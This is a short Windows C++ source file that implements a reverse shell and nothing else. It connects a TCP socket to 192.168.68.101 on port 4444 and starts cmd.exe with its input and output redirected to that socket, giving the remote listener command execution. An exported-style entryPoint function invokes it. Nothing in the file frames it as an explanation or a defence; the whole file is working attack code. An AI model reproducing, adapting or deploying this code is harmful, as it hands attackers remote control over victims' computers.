#include <winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h> // Add this include for inet_pton
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

void ReverseShell() {
    WSADATA wsa;
    SOCKET sock;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    sockaddr_in addr;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

    addr.sin_family = AF_INET;
    inet_pton(AF_INET, "192.168.68.101", &addr.sin_addr);
    addr.sin_port = htons(4444);

    connect(sock, (SOCKADDR*)&addr, sizeof(addr));

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    char cmd[] = "cmd.exe";
    CreateProcessA(0, cmd, 0, 0, TRUE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
}

int entryPoint() {
    ReverseShell();
}
